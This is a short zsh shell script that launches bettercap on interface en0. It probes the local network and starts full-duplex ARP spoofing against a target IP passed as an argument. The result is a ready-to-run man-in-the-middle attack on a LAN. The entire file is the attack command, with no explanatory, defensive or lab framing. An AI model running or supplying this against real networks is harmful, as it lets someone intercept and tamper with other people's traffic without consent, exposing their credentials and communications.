#!/bin/zsh
bettercap -iface en0 -eval "net.probe on; sleep 1; set arp.spoof.fullduplex true; set arp.spoof.targets $1; arp.spoof on"

